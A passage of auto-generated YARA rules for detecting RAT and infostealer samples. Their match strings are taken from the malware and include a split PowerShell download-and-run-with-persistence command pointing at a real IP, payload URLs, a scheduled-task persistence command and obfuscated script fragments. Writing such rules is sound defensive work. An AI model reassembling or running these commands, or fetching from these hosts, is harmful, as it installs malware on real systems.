      $s7 = "ll','2702676FTJnEy','11595166GwycUr','~$$*%$##??#~^!* ~?$~$&*&$^$$*! *#!$^%%$%! ~#^!**#&*%#& #^#!^$~*?*~ &&?*!?!#&&&?*!~!*^ ?^$ " ascii /* score: '30.00'*/
      $s8 = ".dll','422068RmYanE','protocol','45GRLNWI','event','href','ceil','mouseout','Run','src','1674013YgFChn','C:\\x5cWin" fullword ascii /* score: '25.00'*/
      $s9 = "A%A%A^A^A^A&g&L*A*A*8?/?/?A~8~A A E A!A!A#A#I#A$A$Q$p%V%T^','match','4936440eymMBc','text','host','//stats.wordpress.com/c.gif?s" ascii /* score: '23.00'*/
      $s10 = "_blog=_0x4b0071,_post=_0x5c1e13;if(typeof document[_0x44ed08(0x14c)]['host']!=_0x44ed08(0x119))var _0x429f37=document[_0x44ed08(" ascii /* score: '19.00'*/
      $s11 = "8996,_0x33160b){var _0x3abe3d=_0x266c;_blog=_0x2a8996,_post=_0x33160b;if(typeof document[_0x3abe3d(0x14c)]['host']!=_0x3abe3d(0x" ascii /* score: '19.00'*/
      $s12 = "x44eada(0x1a0)?_post:0x0,_0x3bbebf=new Image(0x1,0x1);_0x3bbebf[_0x44eada(0x181)]=_0xe9c4c9+'//stats.wordpress.com/c.gif?s=2&b='" ascii /* score: '19.00'*/
      $s13 = "_post!=_0x84317f(0x119)?_post:0x0,_0x580210=new Image(0x1,0x1);_0x580210[_0x84317f(0x166)]=_0x304f7a+'//stats.wordpress.com/c.gi" ascii /* score: '19.00'*/
      $s14 = "')[_0x496020(0x1ae)]('');function getRandomInt(_0x440dab,_0x390a1e){var _0x378236=_0x496020;return _0x440dab=Math[_0x378236(0x1b" ascii /* score: '19.00'*/
      $s15 = "{var _0x5333e4=_0x266c;_blog=_0x1eb8ee,_post=_0x572acf;if(typeof document[_0x5333e4(0x14c)]['host']!=_0x5333e4(0x119))var _0xb20" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 16000KB and
      1 of ($x*) and all of them
}

rule VenomRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file VenomRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee6844c262a1f73501e51fa9df9c6c993bf442c3d4b78686e3ace38b18789210"
   strings:
      $x1 = "ProcessHacker.exe" fullword wide /* score: '33.00'*/
      $x2 = "C:\\Temp\\client.log" fullword wide /* score: '32.00'*/
      $x3 = "C:\\Temp\\client_ex.log" fullword wide /* score: '32.00'*/
      $s4 = "MpCmdRun.exe" fullword wide /* score: '28.00'*/
      $s5 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s6 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s7 = "ConfigSecurityPolicy.exe" fullword wide /* score: '25.00'*/
      $s8 = "MSConfig.exe" fullword wide /* score: '25.00'*/
      $s9 = "GetUserProcessList" fullword ascii /* score: '23.00'*/
      $s10 = "C://Temp//1.log" fullword wide /* score: '23.00'*/
      $s11 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s12 = "Client.exe" fullword ascii /* score: '22.00'*/
      $s13 = "MsMpEng.exe" fullword wide /* score: '22.00'*/
      $s14 = "keyLogger" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s15 = "procexp.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__89be0060 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_89be0060.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "89be0060e88e37f5b5c3736fff092b5cd6e89eea26c6b4438e8932e7925a4837"
   strings:
      $s1 = "Qaseneyen.SmartBakingController+VB$StateMachine_37_MonitorDoughProofing, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKe" ascii /* score: '29.00'*/
      $s2 = "Qaseneyen.SmartBakingController+VB$StateMachine_28_StreamBakingPhases, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKeyT" ascii /* score: '29.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPd" fullword ascii /* score: '27.00'*/
      $s4 = "Qaseneyen.exe" fullword wide /* score: '27.00'*/
      $s5 = "Qaseneyen.SmartBakingController+VB$StateMachine_28_StreamBakingPhases, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKeyT" ascii /* score: '26.00'*/
      $s6 = "Qaseneyen.SmartBakingController+VB$StateMachine_37_MonitorDoughProofing, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKe" ascii /* score: '23.00'*/
      $s7 = "service@marshmallowmasters.com" fullword wide /* score: '21.00'*/
      $s8 = "r32.dll" fullword ascii /* score: '20.00'*/
      $s9 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s10 = "tem.Com" fullword ascii /* score: '18.00'*/
      $s11 = "Executi" fullword ascii /* score: '18.00'*/
      $s12 = "contact@chocomakers.com" fullword wide /* score: '18.00'*/
      $s13 = "info@sweetgum.com" fullword wide /* score: '18.00'*/
      $s14 = "sales@lollyworld.com" fullword wide /* score: '18.00'*/
      $s15 = "info@sugarfreesweets.com" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule Rhadamanthys_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c627b8f1 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c627b8f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c627b8f1fd2d83709aa3f42a2fe0ea6fc6dd5ab1353f699fb71da4b7ff57f0cc"
   strings:
      $s1 = "Sprdef2.exe" fullword wide /* score: '22.00'*/
      $s2 = "An MKV file was found in the temp folder during batch processing. This may indicate a failed cleanup or overwrite risk." fullword wide /* score: '21.00'*/
      $s3 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s4 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s5 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s6 = "EXE files (*.exe)|*.exe" fullword wide /* score: '19.00'*/
      $s7 = "Stop the current operation. Interrupting the process may cause an error." fullword wide /* score: '19.00'*/
      $s8 = "DocumentModel.GetLineTokens error: {0}" fullword wide /* score: '18.00'*/
      $s9 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s10 = " Could not kill MakeMKV info process." fullword wide /* score: '17.00'*/
      $s11 = " Could not stop process." fullword wide /* score: '17.00'*/
      $s12 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s13 = ":http://crl.sectigo.com/SectigoPublicCodeSigningCAEVR36.crl0{" fullword ascii /* score: '16.00'*/
      $s14 = ":http://crt.sectigo.com/SectigoPublicCodeSigningCAEVR36.crt0#" fullword ascii /* score: '16.00'*/
      $s15 = "DocumentModel.GetAllText error: {0}" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ccfe3443a805b88337e9b3d0698993c9d0c37c09e6c5351886e59067f9e32ef7"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = "YkozMWEgWm" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "DigiCert Timestamp 2022 - 20" fullword ascii /* score: '12.00'*/
      $s5 = "azywMsJHFtPhEYUV" fullword ascii /* score: '9.00'*/
      $s6 = "TdLlGrDLiTLQeNWIyfOrfNU" fullword ascii /* score: '9.00'*/
      $s7 = "GmhhljUMhirCE" fullword ascii /* score: '9.00'*/
      $s8 = "LezDLlxgTeoqLdNVz" fullword ascii /* score: '9.00'*/
      $s9 = "CLGSHEllubdbTSWCTIHkcho" fullword ascii /* score: '9.00'*/
      $s10 = "QjIFPcHcqXBuziiRCmok" fullword ascii /* score: '9.00'*/
      $s11 = "BdYdUjGLogbWuWmzH" fullword ascii /* score: '9.00'*/
      $s12 = "PwdllGlPDo" fullword ascii /* score: '9.00'*/
      $s13 = "ydGtEyeoSDaNTOOdmdI" fullword ascii /* score: '9.00'*/
      $s14 = "wsopNpPkgeTfxvVYQNb" fullword ascii /* score: '9.00'*/
      $s15 = "KsGGdEuuXeYEglYesZvYBEfyd" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__59ac390e {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_59ac390e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59ac390eadca30557132791b273aa9e342623a669ba27c8ee81130df462f0074"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = "RABkNFdOeD" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s3 = "tezWWdUmpncrsbhmk" fullword ascii /* score: '14.00'*/
      $s4 = "zbUdiSEEnXCt" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "qBjISObcWkeYEzuED" fullword ascii /* score: '12.00'*/
      $s6 = "AirCCKeyfBffCVNHoPsg" fullword ascii /* score: '12.00'*/
      $s7 = "#\\-pd$p:\\(|Xph:$(00h8\\Zdhsd(g$#" fullword wide /* score: '10.00'*/
      $s8 = "JL9e2w^T\"jp|dhfh/X\"2p:-h8f\\Ue\"V+dd.:XY.dfph:\"8p:0hsh:" fullword wide /* score: '10.00'*/
      $s9 = "HhxicPuVgvmhcdllFdQURleY" fullword ascii /* score: '9.00'*/
      $s10 = "wRvjEmMNZiGetfRPqcCgBvDOF" fullword ascii /* score: '9.00'*/
      $s11 = "xBAwnjFiYJGCFTPMQJRQK" fullword ascii /* score: '9.00'*/
      $s12 = "jLoGgauOmHdHlIdjnCEUJvknw" fullword ascii /* score: '9.00'*/
      $s13 = "vCKyPwOPDlLOskjIlcUOPAXD" fullword ascii /* score: '9.00'*/
      $s14 = "rcslsQILoGoVzvdiNlhoyD" fullword ascii /* score: '9.00'*/
      $s15 = "leYEVlbIzKHHagZHam" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__24fa7336 {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24fa7336.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24fa73362c2f601aa3016bc38e5d0ca8f5f4d25c37c0ffdc08dc0a022c5e9510"
   strings:
      $s1 = "Microsoft Publisher Host.exe" fullword wide /* score: '24.00'*/
      $s2 = "Xeno-3.14.exe" fullword ascii /* score: '19.00'*/
      $s3 = "MiRUNiRSH" fullword ascii /* base64 encoded string*/ /* score: '17.00'*/
      $s4 = "<StartAsBypass>b__10_0" fullword ascii /* score: '15.00'*/
      $s5 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
      $s6 = "KDEgPClHIK" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "qYlZnOklw" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "ZGtLNiwzt" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "vSnNGcmUqQFE" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "YjWauwyDeUlogX" fullword ascii /* score: '9.00'*/
      $s11 = "kmNMftpTzAtsX" fullword ascii /* score: '9.00'*/
      $s12 = "EYEwiDTMKhEM" fullword ascii /* score: '9.00'*/
      $s13 = "ZSrRYEqBqCFTp" fullword ascii /* score: '9.00'*/
      $s14 = "gcELOGSVyCvug" fullword ascii /* score: '9.00'*/
      $s15 = "jloGtPZKkPoMCe" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SparkRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file SparkRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "17e2f6e0f9793935ae39d6beca31f54379023f39bab8daa717660b46b5eb577f"
   strings:
      $x1 = "$u=\"http://87.106.52.7:6472/sparkworkings.exe\";$p=\"$env:APPDATA\\ClientApp\\sparkworkings.exe\";$startup=\"$env:APPDATA\\Micr" ascii /* score: '45.00'*/
      $s2 = "$u=\"http://87.106.52.7:6472/sparkworkings.exe\";$p=\"$env:APPDATA\\ClientApp\\sparkworkings.exe\";$startup=\"$env:APPDATA\\Micr" ascii /* score: '26.00'*/
      $s3 = "lit-Path $p) | Out-Null};Invoke-WebRequest $u -OutFile $p *> $null;Copy-Item $p -Destination $startup -Force;Start-Process $p -W" ascii /* score: '19.00'*/
      $s4 = "ndows\\Start Menu\\Programs\\Startup\\sparkworkings.exe\";if(-not (Test-Path (Split-Path $p))){New-Item -ItemType Directory -Pat" ascii /* score: '15.00'*/
      $s5 = "get_ControlKeyState" fullword ascii /* score: '12.00'*/
      $s6 = "get_PrivateData" fullword ascii /* score: '12.00'*/
      $s7 = "GetCharFromKeys" fullword ascii /* score: '12.00'*/
      $s8 = "get_ErrorBackgroundColor" fullword ascii /* score: '12.00'*/
      $s9 = "get_ErrorForegroundColor" fullword ascii /* score: '12.00'*/
      $s10 = "PSRunspace-Host" fullword wide /* score: '12.00'*/
      $s11 = "keyinfo" fullword ascii /* score: '11.00'*/
      $s12 = "ReadKey_Box" fullword ascii /* score: '10.00'*/
      $s13 = "get_ShouldExit" fullword ascii /* score: '9.00'*/
      $s14 = "get_ProgressBackgroundColor" fullword ascii /* score: '9.00'*/
      $s15 = "get_VerboseBackgroundColor" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5078c343 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5078c343.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5078c343420073ff89ed24cf79285abacfe4701acd4e33ccdefebb923441d352"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADp" fullword ascii /* score: '27.00'*/
      $s2 = "XKng.exe" fullword wide /* score: '22.00'*/
      $s3 = "XKng.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "products.txt" fullword wide /* score: '14.00'*/
      $s5 = "listings.txt" fullword wide /* score: '14.00'*/
      $s6 = "results.txt" fullword wide /* score: '14.00'*/
      $s7 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s8 = ".NET Framework 4.5*" fullword ascii /* score: '10.00'*/
      $s9 = "get_DateAnnounced" fullword ascii /* score: '9.00'*/
      $s10 = "get_Tokens" fullword ascii /* score: '9.00'*/
      $s11 = "get_Currency" fullword ascii /* score: '9.00'*/
      $s12 = "get_Listings" fullword ascii /* score: '9.00'*/
      $s13 = "scoretext" fullword wide /* score: '8.00'*/
      $s14 = "racketa" fullword wide /* score: '8.00'*/
      $s15 = "listings" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4a9f2f65 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a9f2f65.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a9f2f65791e8bd5f4ba4cac2484577ae8eeb093fd143c1a9e9db88de7b09d7f"
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s2 = "en des Programms Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s3 = "ber das Programm Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s4 = "KatronCarecenter.exe" fullword wide /* score: '18.00'*/
      $s5 = "C:\\Ablage\\Kurbelschwinge.svg" fullword wide /* score: '16.00'*/
      $s6 = "Select * from vms_datakey where ticketkey=@tik and tahunkey=@th" fullword wide /* score: '14.00'*/
      $s7 = " group by material, batch_prod,tiket1,tiket2,tiket3,tiket4,tiket5, idinput1,idinput2,idinput3,idinput4,idinput5,take1,take2,take" wide /* score: '13.00'*/
      $s8 = "Bitte X- und Y-Koordinate des Drehpunktes der Kurbel, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s9 = "Bitte X- und Y-Koordinate des Drehpunktes der Schwinge, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s10 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s11 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s12 = "Getriebe" fullword wide /* score: '11.00'*/
      $s13 = "Verzeichnis der Kurbelschwinge.exe: " fullword wide /* score: '11.00'*/
      $s14 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s15 = "cmdImport" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule ValleyRAT_signature__77e26aa2a5e22bfb9270f8b0ceebb1bb_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_77e26aa2a5e22bfb9270f8b0ceebb1bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd18a62c3dd7f48ddabf288d271cad000e51d629c17f1e5f70127b3dc117ed30"
   strings:
      $x1 = "pbp93q6TU3ThXREqNjwZZMzkHp2MrucQCutPuKt4kXuondWXGgI3Z7PW9exjJGNVncppmJ+0MpPOKh5UySgj5Boh2dV2+8qRkLLnwLkhFObHCTjfNqjbc7yqkFnDSfMq" ascii /* score: '48.00'*/
      $s2 = "C:\\ProgramData\\SystemLauncher\\54\\TelegramService.exe" fullword wide /* score: '27.00'*/
      $s3 = "[+] Shellcode executed successfully" fullword ascii /* score: '25.00'*/
      $s4 = "TelegramService.exe" fullword wide /* score: '25.00'*/
      $s5 = "vboxservice.exe" fullword wide /* score: '25.00'*/
      $s6 = "amsi.dll" fullword ascii /* score: '23.00'*/
      $s7 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s8 = "vmsrvc.exe" fullword wide /* score: '22.00'*/
      $s9 = "vmusrvc.exe" fullword wide /* score: '22.00'*/
      $s10 = "vboxtray.exe" fullword wide /* score: '22.00'*/
      $s11 = "vmwaretray.exe" fullword wide /* score: '22.00'*/
      $s12 = "Decrypted shellcode is empty" fullword ascii /* score: '21.00'*/
      $s13 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s14 = "Decoded data too small" fullword ascii /* score: '18.00'*/
      $s15 = " msftconnecttest.com" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7e67ca62a4743801afd4328a7ff558c84d76a09844b823ed1bb2de3de82d59ab"
   strings:
      $s1 = "http://43.225.47.216:5513/tpsvcBase.dll" fullword wide /* score: '28.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "http://43.225.47.216:5513/TPSvc.exe" fullword wide /* score: '27.00'*/
      $s4 = "tpsvcBase.dll" fullword wide /* score: '23.00'*/
      $s5 = "_ZjyYHX_Hp.exe" fullword wide /* score: '19.00'*/
      $s6 = "http://43.225.47.216:5513/123.ini" fullword wide /* score: '15.00'*/
      $s7 = "customXml/itemProps1.xmle" fullword ascii /* score: '11.00'*/
      $s8 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s9 = "customXml/itemProps1.xmlPK" fullword ascii /* score: '11.00'*/
      $s10 = "[System] Delay completed. Actual waited: " fullword ascii /* score: '10.00'*/
      $s11 = "C:\\Windows\\SysWOW64\\yyk\\" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1f9da49f {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1f9da49f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f9da49f62360d200940ac5abe3936e48f46ec727873c4f13e41fe1a583381a7"
   strings:
      $s1 = "Imfjg.exe" fullword wide /* score: '22.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteDividedTask" fullword ascii /* score: '18.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Net.IPNetwork>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s5 = "RedirectPassiveEncryptor" fullword ascii /* score: '17.00'*/
      $s6 = "https://www.arcon.com.pe/Rypbxem.dat" fullword wide /* score: '17.00'*/
      $s7 = "InstantiateExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "_CreatorExecutorTag" fullword ascii /* score: '16.00'*/
      $s9 = "decryptor" fullword wide /* score: '15.00'*/
      $s10 = "AssembleEncryptor" fullword ascii /* score: '14.00'*/
      $s11 = "GenerateNextInternalLogger" fullword ascii /* score: '14.00'*/
      $s12 = "ChangeLogger" fullword ascii /* score: '14.00'*/
      $s13 = "CreateModularEncryptor" fullword ascii /* score: '14.00'*/
      $s14 = "WatchLiteralLogger" fullword ascii /* score: '14.00'*/
      $s15 = "passiveTransmitterContent" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__b5a014d7eeb4c2042897567e1288a095_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b5a014d7eeb4c2042897567e1288a095(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "140ecf21d10354385de279ce0b5104078f251c096583d156f8627c623502a4ca"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.4.0.1794\" name=\"7-Z" ascii /* score: '45.00'*/
      $s2 = "-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\"></assemblyIdentity></dependent" ascii /* score: '25.00'*/
      $s3 = "y></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel lev" ascii /* score: '22.00'*/
      $s4 = "=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>" fullword ascii /* score: '19.00'*/
      $s5 = "7ZSfxMod_x86.exe" fullword wide /* score: '19.00'*/
      $s6 = "InstallPath=\"%TEMP%\"" fullword ascii /* score: '15.00'*/
      $s7 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s8 = "RunProgram=\"\\\"%%T\\\\Vector-Neur.exe\\\"\"" fullword ascii /* score: '14.00'*/
      $s9 = " \"setup.exe\" " fullword ascii /* score: '11.00'*/
      $s10 = "* PwAy" fullword ascii /* score: '9.00'*/
      $s11 = "ExtractDialogText=\"\"" fullword ascii /* score: '9.00'*/
      $s12 = "* Zhq<" fullword ascii /* score: '9.00'*/
      $s13 = "\\hqAa- 26" fullword ascii /* score: '9.00'*/
      $s14 = "!Require Windows" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s15 = "ebznqzy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__b5a014d7eeb4c2042897567e1288a095_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b5a014d7eeb4c2042897567e1288a095(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a28f0d6f256a59994cbfef8b83c9ce8d8fef795a0e4c7dbe43638e8e383a3377"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.4.0.1794\" name=\"7-Z" ascii /* score: '45.00'*/
      $s2 = "-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\"></assemblyIdentity></dependent" ascii /* score: '25.00'*/
      $s3 = "y></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel lev" ascii /* score: '22.00'*/
      $s4 = "=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>" fullword ascii /* score: '19.00'*/
      $s5 = "7ZSfxMod_x86.exe" fullword wide /* score: '19.00'*/
      $s6 = "InstallPath=\"%TEMP%\"" fullword ascii /* score: '15.00'*/
      $s7 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s8 = "1PTtnTERe" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "RunProgram=\"\\\"%%T\\\\Navigator-Hyper.exe\\\"\"" fullword ascii /* score: '14.00'*/
      $s10 = "* /um}t" fullword ascii /* score: '13.00'*/
      $s11 = " \"setup.exe\" " fullword ascii /* score: '11.00'*/
      $s12 = "){dUMp" fullword ascii /* score: '11.00'*/
      $s13 = "ExtractDialogText=\"\"" fullword ascii /* score: '9.00'*/
      $s14 = "!Require Windows" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s15 = "6~#[ #`-C" fullword ascii /* score: '9.00'*/ /* hex encoded string 'l' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__f6baa5eaa8231d4fe8e922a2e6d240ea_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f6baa5eaa8231d4fe8e922a2e6d240ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e91b243cf07e7e0e6b369a9af64a499823f6c8d11cdd9f8b1a266c1474cc952"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '32.00'*/
      $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '29.00'*/
      $s3 = "RunProgram=\"%%P:hidcon:\\\"main.bat\\\" /S\"" fullword ascii /* score: '24.00'*/
      $s4 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s5 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s6 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s7 = "PreExtract=\"%%P:hidcon:cmd /c \\\"\\\"%%T\\\\KillDuplicate.cmd\\\" \\\"%%T\\\" \\\"%%M\\\"\\\"\"" fullword ascii /* score: '16.00'*/
      $s8 = "YC.exe" fullword wide /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 5 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9151f8c3 {
   meta:
